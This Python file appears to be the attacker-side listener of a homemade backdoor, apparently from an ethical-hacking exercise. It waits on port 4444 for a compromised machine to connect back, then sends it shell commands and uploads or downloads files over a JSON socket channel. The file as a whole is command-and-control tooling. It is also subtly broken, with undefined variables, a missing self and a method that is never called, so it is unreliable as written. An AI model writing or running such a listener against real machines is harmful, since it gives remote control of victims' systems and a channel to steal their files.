#!/usr/bin/env python
import socket, json, base64


def main():
    listener = Listener('10.0.1.6', 4444)
    listener.start()

class Listener: 
    def __init__(self, IP, socket):
        self.IP = IP
        self.socket = socket

    def start(self):
        try:
            # Open connection and once recieved store that connection and the device
            # connecting's address.
            self.connection, self.address = self.open_and_listen()
            print(f'[+] Connection received from {address}.')
            # After a connection is established, run a mock shell
            while True:
                result = self.send_commands(connection)
                print(f'{result}\n\n>>')
        except KeyboardInterrupt:
            # If keyboard interrupt (Ctrl+C) is detected, close the listener and exit
            self.listener.close()
            print('\n[+] Listener closed. Exiting...')
            exit()

    def send_commands(self, connection):
        command = input('>> ')
        command = command.split(' ')
        try:
            # Packages and sends a file for upload and notifies if written properly on backdoor.
            if command[0] == 'upload' and command[1]:
                copied_file = read_file(command[1])
                self.reliable_send([command[0], command[1], copied_file])
                if self.reliable_recieve == 'good transfer':
                    return '[+] Succesfully sent file for upload.'
                return '[-] File transfer unsuccessful.'

            self.reliable_send(command)
            result = self.reliable_recieve()

            if command[0] == 'exit':
                self.connection.close()
                exit(0)

            # Writes a file downloaded from backdoor.
            if command[0] == 'download' and '[-] Error' not in result:
                result = self.write_file(command[1], result)
                return result

            return result
        except Exception:
            return '[-] Error during command execution.'

    def write_file(self, name, content):
        with open(name, 'wb') as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def read_file(self, name):
        with open(name, "rb") as file:
            return base64.b64encode(file.read())

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recieve(self):
        json_data = ''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def open_and_listen(self):
        # Create a socket
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Allow reuse of a socket in TIME_WAIT state, without waiting for its natural timeout to expire
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Bind the socket to the specified IP and port
        self.listener.bind((self.IP, self.socket))
        # Start listening for connections
        self.listener.listen(0)
        print('[+] Waiting for incoming connections...')
        # Accept a connection
        connection, address = self.listener.accept()
        # Return the connection and the address of the client
        return connection, address

if __name__ == '__main__':
    main()
